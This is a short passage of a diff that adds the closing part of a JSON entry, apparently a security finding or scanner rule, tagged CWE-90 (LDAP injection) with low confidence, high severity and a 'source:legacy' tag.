+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    }
+  ]
+}
